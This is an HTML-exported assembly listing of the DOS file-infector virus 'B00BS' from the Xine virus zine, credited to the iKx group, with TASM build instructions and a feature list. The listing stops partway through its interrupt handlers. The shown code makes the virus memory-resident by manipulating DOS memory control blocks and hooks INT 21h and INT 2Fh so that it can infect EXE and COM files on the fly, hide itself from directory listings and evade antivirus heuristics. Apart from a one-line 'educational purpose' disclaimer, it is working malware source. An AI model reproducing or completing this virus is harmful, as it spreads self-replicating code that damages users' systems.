<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #2 - Phile 029 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">

</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">; THIS IS FOR EDUCATIONAL PURPOSE ONLY                               Gi0rGeTt0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Virus name    : B00BS</span><span class="sc0">
</span><span class="sc1">; Author        : Unknwon :)</span><span class="sc0">
</span><span class="sc1">; Group         : iKx</span><span class="sc0">
</span><span class="sc1">; Origin        : Italy 1996/97</span><span class="sc0">
</span><span class="sc1">; Compiling     : Use TASM</span><span class="sc0">
</span><span class="sc1">;                 TASM /M2 B00BS.ASM</span><span class="sc0">
</span><span class="sc1">;                 TLINK B00BS</span><span class="sc0">
</span><span class="sc1">; Targets       : EXE COM</span><span class="sc0">
</span><span class="sc1">; Features      : stealth via 11h,12h,4eh,4fh,disinfect and infect on the fly</span><span class="sc0">
</span><span class="sc1">;                 on opening(3dh,6c00h) and closing(3eh) ,int 24h handler</span><span class="sc0">
</span><span class="sc1">;                 TSR by MCB and int21h (48h)</span><span class="sc0">
</span><span class="sc1">;                 uses some 386 instructions for some routines (just for fun)</span><span class="sc0">
</span><span class="sc1">;                 fucks TBAV,AVP,F-PROT heuristic shits</span><span class="sc0">
</span><span class="sc1">; improvements  : needs a poly engine</span><span class="sc0">
</span><span class="sc1">; payload       : none </span><span class="sc0">
</span><span class="sc1">; Greetings     : to all the guys of the iKx and all the</span><span class="sc0">
</span><span class="sc1">;                 other guys on #virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß</span><span class="sc0">
</span><span class="sc1">; The file is a EXE</span><span class="sc0">


</span><span class="sc2">.386</span><span class="sc0">

</span><span class="sc5">CSeg</span><span class="sc0"> </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc9">USE16</span><span class="sc0">

</span><span class="sc9">ASSUME</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">CSeg</span><span class="sc0">

</span><span class="sc5">FileHeaderRecord</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
          </span><span class="sc5">signature</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">sizemod</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">msize</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">relocat</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">headsize</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">minalloc</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">maxalloc</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">stackseg</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">stackofs</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">check</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">ip</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">codes</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">Checksum</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">checkOvr</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">FileHeaderRecord</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">SearchRecord</span><span class="sc0">  </span><span class="sc9">struc</span><span class="sc0">
           </span><span class="sc5">date</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
           </span><span class="sc5">time</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SearchRecord</span><span class="sc0">  </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">ExecBlockRecord</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
         </span><span class="sc5">Env</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
         </span><span class="sc5">Cmd</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ExecBlockRecord</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">Findrecord</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
        </span><span class="sc5">FindBuf</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">Findofs</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Findrecord</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">VIR_PAR</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">END_TSR</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">START_TSR</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">VIR_LEN</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">REAL_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">START_TSR</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; dim virus in memoria</span><span class="sc0">
</span><span class="sc5">VIR_TRUE_LEN</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc0"> </span><span class="sc5">REAL_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">START_TSR</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; dimensione del virus su file</span><span class="sc0">


</span><span class="sc5">already</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; already infected</span><span class="sc0">
</span><span class="sc5">ready</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; ready to be infected</span><span class="sc0">
</span><span class="sc5">com</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; com file</span><span class="sc0">
</span><span class="sc5">exe</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; exe file</span><span class="sc0">
</span><span class="sc5">other</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">; other</span><span class="sc0">

</span><span class="sc5">true</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">false</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maxfiles</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">26</span><span class="sc0">         </span><span class="sc1">; max file no to open , must be (maxfiles*2)/4 integer</span><span class="sc0">

</span><span class="sc5">START_TSR</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">AfterCryp</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SH</span><span class="sc0">
</span><span class="sc5">SH</span><span class="sc0">        </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fe01h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2fh</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0">  </span><span class="sc5">Novirus</span><span class="sc0">

</span><span class="sc5">YesVirus</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">
         </span><span class="sc5">jmp_addr</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                                 </span><span class="sc1">; ES = DS = PSP = AX</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                                </span><span class="sc1">; PSP +  1 paragraph</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc5">templateheader.stackseg</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">cli</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc5">templateheader.stackofs</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc5">templateheader.codes</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                                   </span><span class="sc1">; push CS</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc5">templateheader.ip</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; push IP</span><span class="sc0">

</span><span class="sc5">@jump</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

         </span><span class="sc6">retf</span><span class="sc0">                                      </span><span class="sc1">; jmp to host CS:IP</span><span class="sc0">

</span><span class="sc5">com_exec</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                                   </span><span class="sc1">; COM settings</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@com_buf</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">movsd</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@jump</span><span class="sc0">


</span><span class="sc5">NoVirus</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; enviroment segment</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc5">tmp_COMseg</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                                    </span><span class="sc1">; DS = PSP</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                       </span><span class="sc1">; AX = MCB</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                 </span><span class="sc1">; last fit</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5801h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">                    </span><span class="sc1">; set</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">VIR_PAR</span><span class="sc0">             </span><span class="sc1">; malloc</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">malloc</span><span class="sc0">           </span><span class="sc1">; problems ?</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">4d03h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">bh</span><span class="sc0">                                         </span><span class="sc1">;'M'</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc5">VIR_PAR</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc5">VIR_PAR</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">                                   </span><span class="sc1">; Z in last MCB</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">malloc</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">                               </span><span class="sc1">; owned by dos 0008</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc12">'CS'</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">                                    </span><span class="sc1">; restore strategy</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5801h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">VIR_LEN</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0">          </span><span class="sc6">movsd</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">clean_x_stack</span><span class="sc0">

         </span><span class="sc6">cli</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOOK_21</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">84h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">TRAPPED_21</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOOK_2F</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0bch</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">TRAPPED_2F</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                                </span><span class="sc1">; DS = PSP</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">sleep</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">command_Flag</span><span class="sc4">,</span><span class="sc5">TRUE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc5">tmp_COMseg</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">COMseg</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">sti</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">yesvirus</span><span class="sc0">

         </span><span class="sc5">tmp_COMseg</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">HOOK_2F</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0">  </span><span class="sc5">ChkintWin</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
         </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">;///// Chkintwin and ChkEndwin disable the virus during installation check in</span><span class="sc0">
</span><span class="sc1">;      win311 and under Msdos prompt in w95 /////</span><span class="sc0">

</span><span class="sc1">;      Under Msdos prompt only some int21h trap worked :(( i.e 4b</span><span class="sc0">
</span><span class="sc1">;      but 3dh,3eh and some other as all long filenames functions didn't work</span><span class="sc0">
</span><span class="sc1">;      i dunno the reason since i hadn't much time for solving the question</span><span class="sc0">
</span><span class="sc1">;      if someone can explain it let me know pleaze :)</span><span class="sc0">

</span><span class="sc5">ChkintWin</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1605h</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">chkendwin</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">sleep</span><span class="sc4">,</span><span class="sc5">TRUE</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">pass2f</span><span class="sc0">

</span><span class="sc5">ChkEndWin</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1606h</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">pass2f</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">sleep</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">

